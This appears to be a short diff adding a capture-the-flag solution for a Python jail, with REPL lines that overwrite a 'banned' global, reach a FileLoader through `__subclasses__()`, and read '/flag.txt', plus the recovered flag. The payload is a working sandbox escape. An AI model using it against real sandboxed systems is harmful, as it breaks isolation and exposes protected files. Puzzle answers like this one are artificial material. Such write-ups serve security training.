@@ -1,0 +1,7 @@
+# lets see what we can use by : `().__class__.__bases__[0].__subclasses__()`
+# got FileLoader
+
+>>>globals['banned']='xd'
+>>>print(().__class__.__bases__[0].__subclasses__()[94]('','').get_data('/flag.txt'))
+
+# flag{l3t's_try_sc0p1ng_th1s_0ne_2390098}
